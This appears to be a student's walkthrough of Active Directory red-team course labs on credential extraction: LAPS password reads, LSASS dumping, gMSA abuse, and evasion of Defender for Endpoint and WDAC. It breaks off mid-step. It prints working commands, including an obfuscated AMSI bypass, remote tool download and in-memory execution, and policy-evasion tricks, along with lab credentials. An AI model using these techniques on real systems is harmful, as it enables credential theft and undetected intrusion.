# Credential Extraction

## LAPS (Local Administrator Password Solution) Abuse

### Lab: Hands-On #08

#### Tasks

- Identify OUs where LAPS is in use and user(s) who have permission to read passwords
- Abuse the permissions to get the clear text password(s)

#### Solution

- Identify OUs where LAPS is in use and user(s) who have permission to read passwords

First, we need to find the OUs where LAPS is in use.
We can enumerate this using the ActiveDirectory module and LAPS module: let's use `Get-LAPSPermissions.ps1` PowerShell script for that.

**AD Module** + **LAPS Module**

```
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

[SNIP]

PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

```
PS C:\AD\Tools> C:\AD\Tools\Get-LapsPermissions.ps1

Read Rights

organizationalUnit                     IdentityReference
------------------                     -----------------
OU=MailMgmt 📑,DC=us,DC=techcorp,DC=local US\studentusers 👥

Write Rights

OU=MailMgmt,DC=us,DC=techcorp,DC=local NT AUTHORITY\SELF
```

We also use PowerView for this enumeration.

**PowerView**

```
PS C:\AD\Tools> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

AceQualifier           : AccessAllowed
ObjectDN               : OU=MailMgmt 📑,DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd 📌
ObjectSID              :
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-1116
AccessMask             : 272
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit, InheritOnly
InheritedObjectAceType : Computer
OpaqueLength           : 0
IdentityName           : US\studentusers 👥
```

```
PS C:\AD\Tools> (Get-DomainOU -Identity MailMgmt).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

name
----
US-MAILMGMT 🖥️
```

- Abuse the permissions to get the clear text password(s)

So, the `studentusers` group can read password for LAPS managed Administrator on the `us-mailmgmt` machine.

Let's try it using the Active Directory module, PowerView and LAPS module: let's use `AdmPwd.PS.psd1` PowerShell script for that.

**AD Module**

```
PS C:\AD\Tools> Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd

9};,)J6p2[67[3 🔑
```

**PowerView**

```
PS C:\AD\Tools> Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd

9};,)J6p2[67[3 🔑
```

**LAPS Module**

```
PS C:\AD\Tools> Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose

VERBOSE: Loading module from path 'C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1'.
VERBOSE: Loading 'FormatsToProcess' from path 'C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.format.ps1xml'.
VERBOSE: Loading module from path 'C:\AD\Tools\AdmPwd.PS\.\AdmPwd.PS.dll'.
VERBOSE: Exporting cmdlet 'Update-AdmPwdADSchema'.
VERBOSE: Exporting cmdlet 'Get-AdmPwdPassword'.
VERBOSE: Exporting cmdlet 'Reset-AdmPwdPassword'.
VERBOSE: Exporting cmdlet 'Set-AdmPwdComputerSelfPermission'.
VERBOSE: Exporting cmdlet 'Find-AdmPwdExtendedRights'.
VERBOSE: Exporting cmdlet 'Set-AdmPwdAuditing'.
VERBOSE: Exporting cmdlet 'Set-AdmPwdReadPasswordPermission'.
VERBOSE: Exporting cmdlet 'Set-AdmPwdResetPasswordPermission'.
VERBOSE: Importing cmdlet 'Find-AdmPwdExtendedRights'.
VERBOSE: Importing cmdlet 'Get-AdmPwdPassword'.
VERBOSE: Importing cmdlet 'Reset-AdmPwdPassword'.
VERBOSE: Importing cmdlet 'Set-AdmPwdAuditing'.
VERBOSE: Importing cmdlet 'Set-AdmPwdComputerSelfPermission'.
VERBOSE: Importing cmdlet 'Set-AdmPwdReadPasswordPermission'.
VERBOSE: Importing cmdlet 'Set-AdmPwdResetPasswordPermission'.
VERBOSE: Importing cmdlet 'Update-AdmPwdADSchema'.
```

```
PS C:\AD\Tools> Get-AdmPwdPassword -ComputerName us-mailmgmt | select -ExpandProperty Password

9};,)J6p2[67[3 🔑
```

Let's try to access the `us-mailmgmt` machine with this password by using winrs.
Success means administrative access.

```
PS C:\AD\Tools> winrs -r:us-mailmgmt -u:.\administrator -p:'9};,)J6p2[67[3' cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
🚀

C:\Users\Administrator>set username
USERNAME=Administrator 👤

C:\Users\Administrator>set computername
COMPUTERNAME=US-MAILMGMT 🖥️
```

We can also use a PSRemoting session.

```
PS C:\AD\Tools> $passwd = ConvertTo-SecureString '9};,)J6p2[67[3' -AsPlainText -Force

PS C:\AD\Tools> $creds = New-Object System.Management.Automation.PSCredential("us-mailmgmt\administrator", $passwd)

UserName                                      Password
--------                                      --------
us-mailmgmt\administrator System.Security.SecureString

PS C:\AD\Tools> $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds

PS C:\AD\Tools> $mailmgmt

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          us-mailmgmt 🖥️  RemoteMachine   Opened 🚀    Microsoft.PowerShell     Available
```

---
---

## LSASS Dump

### Lab: Hands-On #09

Tools used:
- NetLoader
- SafetyKatz
- Bitsadmin
- Invoke-Mimi

#### Tasks

- Extract credentials of interactive logon sessions and service accounts from `us-mailmgmt`

#### Solution

- Extract credentials of interactive logon sessions and service accounts from `us-mailmgmt`

We can use either winrs and open-source binaries or PowerShell Remoting and `Invoke-Mimi.ps1`. Let us try them one by one.

**winrs and open-source binaries**

Use the credentials for administrator from the previous hands-on (#08) to access `us-mailmgmt`.

```
PS C:\AD\Tools> net use X: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator '9};,)J6p2[67[3'

The command completed successfully.

PS C:\AD\Tools> echo F | xcopy C:\AD\Tools\Loader.exe X:\Loader.exe

[SNIP]

C:\AD\Tools\Loader.exe
1 File(s) copied

PS C:\AD\Tools> net use X: /d

X: was deleted successfully.
```

⭐ Alternatively, we could also use bitsadmin, a Microsoft signed binary, to download `Loader.exe` (NetLoader) on `us-mailmgmt`.
Remember to host `Loader.exe` on a local web server on your student VM.

```
C:\AD\Tools> winrs -r:us-mailmgmt -u:.\administrator -p:'9};,)J6p2[67[3' "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"

BITSADMIN version 3.0
BITS administration utility.
(C) Copyright Microsoft Corp.

Transfer complete.
```

⚠️ If you get an error like: "Unable to add file - 0x800704dd. The operation being requested was not performed because the user has not logged on to the network. The specified service does not exist.", then you may like to use `xcopy` to copy the loader.

Next, we can download and run SafetyKatz in memory using Loader.

⭐ To bypass behaviour detection of SafetyKatz we need to perform an additional step: we need to forward traffic from local (target) machine to the student VM. This way, the download always happens from `127.0.0.1`.

Run the following commands to connect to `us-mailmgmt` using winrs and forward the traffic.

```
PS C:\AD\Tools> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::8de:e9be:7cb3:1077%8
   IPv4 Address. . . . . . . . . . . : 192.168.100.51 🌐
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.254
```

```
PS C:\AD\Tools> winrs -r:us-mailmgmt -u:.\administrator -p:'9};,)J6p2[67[3' cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Administrator>
🚀

C:\Users\Administrator> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.51
```

Now, we will use the Loader to run SafetyKatz from memory to extract credentials from the LSASS process.
Remember to host `SafetyKatz.exe` on a local web server on your Student VM.

Use `ArgSplit.bat` on the student VM to encode "sekurlsa::ekeys".

```
C:\AD\Tools> C:\AD\Tools\ArgSplit.bat

[!] Argument Limit: 180 characters
[+] Enter a string: sekurlsa::ekeys

[SNIP]
```

Copy the generated commands and use it on the winrs session on `us-mailmgmt`.

```
C:\Users\Administrator> echo %Pwn%

sekurlsa::ekeys

C:\Users\Administrator> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn%" "exit"

[SNIP]

mimikatz(commandline) # sekurlsa::ekeys

[SNIP]

Authentication Id : 0 ; 235531 (00000000:0003980b)
Session           : Service from 0
User Name         : provisioningsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/2/2024 2:13:10 AM
SID               : S-1-5-21-210670787-2521448726-163245708-8602

         * Username : provisioningsvc 👤
         * Domain   : US.TECHCORP.LOCAL
         * Password : T0OverseethegMSAaccounts!! 🔑
         * Key List :
           aes256_hmac       a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a 🔑
           aes128_hmac       7ae58eac70cbf4fd3ddab37ecb07067e
           rc4_hmac_nt       44dea6608c25a85d578d0c2b6f8355c4 🔑

[SNIP]

Authentication Id : 0 ; 28896 (00000000:000070e0)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/2/2024 2:12:54 AM
SID               : S-1-5-96-0-0

         * Username : US-MAILMGMT$ 👤
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES 🔑
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941 🔑

[SNIP]
```

**PowerShell Remoting and Invoke-Mimi**

We will use Invoke-Mimi on `us-mailmgmt` to extract credentials.

```
PS C:\AD\Tools> $passwd = ConvertTo-SecureString '9};,)J6p2[67[3' -AsPlainText -Force

PS C:\AD\Tools> $creds = New-Object System.Management.Automation.PSCredential("us-mailmgmt\administrator", $passwd)

UserName                                      Password
--------                                      --------
us-mailmgmt\administrator System.Security.SecureString

PS C:\AD\Tools> $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
```

```
PS C:\AD\Tools> Enter-PSSession $mailmgmt

[us-mailmgmt]: PS C:\Users\Administrator\Documents>
🚀

[us-mailmgmt]: PS C:\Users\Administrator\Documents> $env:username
Administrator 👤

[us-mailmgmt]: PS C:\Users\Administrator\Documents> $env:computername
US-MAILMGMT 🖥️
```

⭐ We need to disable AMSI for the PSSession so that we can use the stock `Invoke-Mimi.ps1` script.
To avoid disabling AMSI, you can use modified Invoke-Mimi instead.

```
[us-mailmgmt]: PS C:\Users\Administrator\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

[us-mailmgmt]: PS C:\Users\Administrator\Documents> exit
PS C:\AD\Tools>
```

Now, load Invoke-Mimi in the remote session and execute it to extract the secrets. Note that we have already disabled AMSI for this PSSession.

```
PS C:\AD\Tools> Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt

PS C:\AD\Tools> Enter-PSSession $mailmgmt

[us-mailmgmt]: PS C:\Users\Administrator\Documents> Invoke-Mimi -Command '"sekurlsa::keys"'

[SNIP]

mimikatz(powershell) # sekurlsa::keys

[SNIP]

Authentication Id : 0 ; 235531 (00000000:0003980b)
Session           : Service from 0
User Name         : provisioningsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/2/2024 2:13:10 AM
SID               : S-1-5-21-210670787-2521448726-163245708-8602

         * Username : provisioningsvc 👤
         * Domain   : US.TECHCORP.LOCAL
         * Password : T0OverseethegMSAaccounts!! 🔑
         * Key List :
           aes256_hmac       a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a 🔑
           aes128_hmac       7ae58eac70cbf4fd3ddab37ecb07067e
           rc4_hmac_nt       44dea6608c25a85d578d0c2b6f8355c4 🔑

[SNIP]

Authentication Id : 0 ; 28896 (00000000:000070e0)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/2/2024 2:12:54 AM
SID               : S-1-5-96-0-0

         * Username : US-MAILMGMT$ 👤
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES 🔑
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941 🔑

[SNIP]
```

---
---

## GMSA (Group Managed Service Account) Abuse

### Lab: Hands-On #10.1

#### Tasks

- Enumerate gMSAs in the `us.techcorp.local` domain
- Enumerate the principals that can read passwords from any gMSAs
- Compromise one such principal and retrieve the password from a gMSA
- Find if the gMSA has high privileges on any machine and extract credentials from that machine

#### Solution

- Enumerate gMSAs in the `us.techcorp.local` domain

```
C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

PS C:\AD\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

```
PS C:\AD\Tools> Get-ADServiceAccount -Filter *

DistinguishedName : CN=jumpone,CN=Managed Service Accounts,DC=us,DC=techcorp,DC=local
Enabled           : True
Name              : jumpone
ObjectClass       : msDS-GroupManagedServiceAccount 📌
ObjectGUID        : 1ac6c58e-e81d-48a8-bc42-c768d0180603
SamAccountName    : jumpone$ 👤
SID               : S-1-5-21-210670787-2521448726-163245708-8601
UserPrincipalName :
```

- Enumerate the principals that can read passwords from any gMSAs

```
PS C:\AD\Tools> Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=provisioning svc 👤,CN=Users,DC=us,DC=techcorp,DC=local}
```

- Compromise one such principal and retrieve the password from a gMSA

Recall from previous hands-on (#09) that we got secrets of `provisioningsvc` from `us-mailmgmt`.

Start a new process as the `provisioningsvc` user.
Run the below command from an elevated cmd shell.

```
C:\Windows\system32> C:\AD\Tools\ArgSplit.bat

[!] Argument Limit: 180 characters
[+] Enter a string: asktgt

[SNIP]
```

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:provisioningsvc /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

[SNIP]

[*] Action: Ask TGT

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  provisioningsvc
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  4/27/2025 10:31:51 AM
  EndTime                  :  4/27/2025 8:31:51 PM
  RenewTill                :  5/4/2025 10:31:51 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  pOmn0/oSZo+F9jOSpoqp139XilgxPnJcGhf0SzIp6v8=
  ASREP (key)              :  A573A68973BFE9CBFB8037347397D6AD1AAE87673C4F5B4979B57C0B745AEE2A
```

In the new cmd session, run the following commands to get the password blob.

```
C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

[SNIP]

PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

```
PS C:\Windows\system32> $passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```

Using the DSInternals module, let's decode the password and convert it to NTLM hash (as the clear-text password is not writable).

```
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1

PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $passwordblob

PS C:\Windows\system32> ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword

002280692be1ec66d62906c8d0556206 🔑
```

- Find if the gMSA has high privileges on any machine and extract credentials from that machine

Now we can start a new process with the privileges of `jumpone`.

```
C:\Windows\system32> echo %Pwn%

asktgt

C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:jumpone /rc4:002280692be1ec66d62906c8d0556206 /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

[SNIP]

[*] Action: Ask TGT

[SNIP]

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/US.TECHCORP.LOCAL
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  jumpone$
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  4/27/2025 10:34:56 AM
  EndTime                  :  4/27/2025 8:34:56 PM
  RenewTill                :  5/4/2025 10:34:56 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Thb7Qo1wMZnviuIV0Z0zv3mg8R0s+yIDXTca4ER0Odw=
  ASREP (key)              :  002280692BE1EC66D62906C8D0556206
```

Check for admin privileges on a machine in the target domain.
Run the below commands in the process running with privileges of `jumpone`.

```
C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

[SNIP]

PS C:\Windows\system32> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1

PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose

us-jump3 🖥️
```

We have administrative access to `us-jump3` machine as `jumpone`.
We can now access `us-jump3` using winrs or PowerShell Remoting.

---
---

## LSASS Dump with MDE & WDAC Bypassing

### Lab: Hands-On #10.2

#### Tasks

- Move laterally and extract credentials on `us-jump` bypassing MDE

**Credentials Extraction on `us-jump3` - MDE Bypass**

Let us now test to see if an EDR is enabled on the target using `Invoke-EDRChecker.ps1` as follows.
Run the following command in the process spawned as `jumpone`.

```
PS C:\Windows\system32> Import-Module C:\AD\Tools\Invoke-EDRChecker.ps1

PS C:\Windows\system32> Invoke-EDRChecker -Remote -ComputerName us-jump3

[SNIP]

[!] Performing EDR Checks against us-jump3.us.techcorp.local, remote checks are limited to process listing, common install directories and installed services

[!] Checking running processes of us-jump3.us.techcorp.local
[-] ProcessName=MsMpEng; Name=MsMpEng; Path=; Company=; Product=; Description=
[-] ProcessName=NisSrv; Name=NisSrv; Path=; Company=; Product=; Description=
[-] ProcessName=SecurityHealthService; Name=SecurityHealthService; Path=; Company=; Product=; Description=

[!] Checking running services of us-jump3.us.techcorp.local
[-] Name=mpssvc; DisplayName=Windows Defender Firewall; ServiceName=mpssvc
[-] Name=SecurityHealthService; DisplayName=Windows Security Service; ServiceName=SecurityHealthService
[-] Name=Sense; DisplayName=Windows Defender Advanced Threat Protection Service; ServiceName=Sense 📌
[-] Name=WdNisSvc; DisplayName=Windows Defender Antivirus Network Inspection Service; ServiceName=WdNisSvc
[-] Name=WinDefend; DisplayName=Windows Defender Antivirus Service; ServiceName=WinDefend

[!] Checking Program Files on us-jump3.us.techcorp.local
[-] Name=Sysmon
[-] Name=Windows Defender
[-] Name=Windows Defender Advanced Threat Protection

[!] Checking Program Files x86 on us-jump3.us.techcorp.local
[-] Name=Windows Defender

[!] Checking Program Data on us-jump3.us.techcorp.local
[+] Nothing found in Program Data

[!] Checking installed services on us-jump3.us.techcorp.local
[-] Name=mpssvc; DisplayName=Windows Defender Firewall; ServiceName=mpssvc
[-] Name=SecurityHealthService; DisplayName=Windows Security Service; ServiceName=SecurityHealthService
[-] Name=Sense; DisplayName=Windows Defender Advanced Threat Protection Service; ServiceName=Sense
[-] Name=WdNisSvc; DisplayName=Windows Defender Antivirus Network Inspection Service; ServiceName=WdNisSvc
[-] Name=WinDefend; DisplayName=Windows Defender Antivirus Service; ServiceName=WinDefend

[SNIP]
```

We find that Microsoft Defender for Endpoint (MDE) is enabled on the target `us-jump3`.

We can access `us-jump3` using winrs in the process running as `jumpone` that we started above.

```
PS C:\Windows\system32> winrs -r:us-jump3 cmd

Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\jumpone$>
🚀

C:\Users\jumpone$>set u

USERDNSDOMAIN=US.TECHCORP.LOCAL
USERDOMAIN=US
USERNAME=jumpone$ 👤
USERPROFILE=C:\Users\jumpone$
```

⭐To avoid detections using commonly used LOLBAS such as `whoami.exe`, we can use the `set u`/`set username` command to enumerate our current user using environment variables.

Trying to execute a LOLBAS such as `wmic` results in a failure as follows.

```
C:\Users\jumpone$>wmic

The system cannot execute the specified program.
❌
```

Exiting the shell and enumerating Windows Defender Application Control (WDAC) status using `Get-CimInstance` cmdlet we find that WDAC has been enabled on `us-jump3`.

```
C:\Users\jumpone$>exit

PS C:\Windows\system32> winrs -r:us-jump3 "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"

[SNIP]

AvailableSecurityProperties                  : {1, 3, 5, 7}
CodeIntegrityPolicyEnforcementStatus         : 2 📌
InstanceIdentifier                           : 4ff40742-2649-41b8-bdd1-e80fad1cce80
RequiredSecurityProperties                   : {0}
SecurityServicesConfigured                   : {0}
SecurityServicesRunning                      : {0}
UsermodeCodeIntegrityPolicyEnforcementStatus : 2 📌
Version                                      : 1.0 📌
VirtualizationBasedSecurityStatus            : 0
VirtualMachineIsolation                      : False
VirtualMachineIsolationProperties            : {0}
PSComputerName                               :
```

We can now attempt to copy and parse the WDAC config deployed on `us-jump3` to find suitable bypasses and loopholes in the policy.

```
PS C:\Windows\system32> dir \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity

    Directory: \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/12/2019  12:49 AM         109627 BlockRules.xml
-a----        12/4/2023  12:58 AM          60636 DG.bin.p7 📌
-a----         1/4/2024   6:28 AM          25628 driver.stl
-a----         1/4/2024   6:29 AM         150679 driversipolicy.p7b
-a----        12/4/2023  12:58 AM          60636 SiPolicy.p7b 📌
```

We find a deployed policy named `DG.bin.p7`/`SiPolicy.p7b` in the `CodeIntegrity` folder. Copy either policy binary back over to our student VM.

```
PS C:\Windows\system32> copy \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
```

⭐ Note that to confirm that a WDAC policy was deployed using GPO, we would have to enumerate the specific GPO GUID path (e.g. SYSVOL on DC) and locate the appropriate `Registry.pol` file in the Machine subdirectory. We can then use the `Parse-PolFile` cmdlet to parse the `Registry.Pol` file and attempt to read the exact deployment location and other details for the WDAC policy (can be deployed locally or on a remote share).

Now spawn a new PowerShell prompt on the student VM using Invisi-Shell and import the `CIPolicyParser.ps1` script to parse the copied policy binary.

```
C:\Users\studentuser51> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

[SNIP]

PS C:\Users\studentuser51> Import-Module C:\AD\Tools\CIPolicyParser.ps1

PS C:\Users\studentuser51> ConvertTo-CIPolicy -BinaryFilePath C:\AD\Tools\DG.bin.p7 -XmlFilePath C:\AD\Tools\DG.bin.xml

    Directory: C:\AD\Tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/27/2025  10:45 AM          87806 DG.bin.xml 📌
```

Analysing the Policy XML we find an interesting rule.
We can navigate to this rule quickly by searching for the string: "Vmware".

```
PS C:\Users\studentuser51> notepad C:\AD\Tools\DG.bin.xml

[SNIP]

<Deny ID="ID_DENY_D_0213" FileName="MSBuild.Exe" />
    <Deny ID="ID_DENY_D_0214" FileName="mshta.exe" />
    <Deny ID="ID_DENY_D_0215" FileName="msxml3.dll" MinimumFileVersion="8.110.17763.54" />
    <Deny ID="ID_DENY_D_0216" FileName="msxml6.dll" MinimumFileVersion="6.30.17763.54" />
    <Deny ID="ID_DENY_D_0217" FileName="ntkd.Exe" />
    <Deny ID="ID_DENY_D_0218" FileName="ntsd.Exe" />
    <Deny ID="ID_DENY_D_0219" FileName="powershellcustomhost.exe" />
    <Deny ID="ID_DENY_D_021A" FileName="rcsi.Exe" />
    <Deny ID="ID_DENY_D_021B" FileName="runscripthelper.exe" />
    <Deny ID="ID_DENY_D_021C" FileName="texttransform.exe" />
    <Deny ID="ID_DENY_D_021D" FileName="visualuiaverifynative.exe" />
    <Deny ID="ID_DENY_D_021E" FileName="wfc.exe" />
    <Deny ID="ID_DENY_D_021F" FileName="windbg.Exe" />
    <Deny ID="ID_DENY_D_0220" FileName="wmic.exe" />
    <Deny ID="ID_DENY_D_0221" FileName="wsl.exe" />
    <Deny ID="ID_DENY_D_0222" FileName="wslconfig.exe" />
    <Deny ID="ID_DENY_D_0223" FileName="wslhost.exe" />
    <Allow ID="ID_ALLOW_A_0224" ProductName="Vmware Workstation" /> 📌
  </FileRules>
```

This is a File Attribute Allow rule that allows a file (exe/dll) having the Product Name: "Vmware Workstation".
We can attempt to abuse this rule by editing the File Attributes of an exe/dll of choice to match the Product Name mentioned. rcedit is a tool that can be used to easily achieve this.

MDE also has been enabled on `us-jump3` as enumerated previously.
We can now attempt to perform an LSASS dump on the target `us-jump3` using a covert technique/tool to bypass MDE along with WDAC.

⭐ We will be using the mockingjay POC (loader/dropper) along with nanodump shellcode to bypass MDE detections and perform a covert LSASS dump.
To bypass WDAC we edit File Attributes to match the Product Name: "Vmware Workstation" on all required files (exe/dll) of the mockingjay POC.
Begin by editing File Attributes for all required mockingjay files using rcedit to match the Product Name: "Vmware Workstation" and zip all required contents as follows.

Note that `msvcp140.dll`, `vcruntime140.dll`, `vcruntime140_1.dll` are `mockingjay.exe` dependency DLLs (located at `\Windows\system32`) which are transferred too because WDAC is enabled on the target and would block them, while `mscorlib.ni.dll` is the DLL with the free RWX section to perform Self Process Injection in.

```
C:\AD\Tools> C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\msvcp140.dll --set-version-string "ProductName" "Vmware Workstation"

C:\AD\Tools> C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140.dll --set-version-string "ProductName" "Vmware Workstation"

C:\AD\Tools> C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140_1.dll --set-version-string "ProductName" "Vmware Workstation"

C:\AD\Tools> C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mockingjay.exe --set-version-string "ProductName" "Vmware Workstation"

C:\AD\Tools> C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mscorlib.ni.dll --set-version-string "ProductName" "Vmware Workstation"
```

```
C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

PS C:\AD\Tools> Compress-Archive -Path C:\AD\Tools\mockingjay\msvcp140.dll, C:\AD\Tools\mockingjay\vcruntime140.dll, C:\AD\Tools\mockingjay\vcruntime140_1.dll, C:\AD\Tools\mockingjay\mockingjay.exe, C:\AD\Tools\mockingjay\mscorlib.ni.dll -DestinationPath C:\AD\Tools\mockingjay\mockingjay.zip
```

Now convert nanodump into compatible shellcode using donut along with the with the args:
- spoof-callstack (`-sc`),
- fork LSASS process before dumping (`-f`)
- output the dump to a file named `nano.dmp` (`--write`) to make it dump LSASS in a covert way.

Note that shellcode doesn't need to be edited using rcedit to bypass WDAC.

```
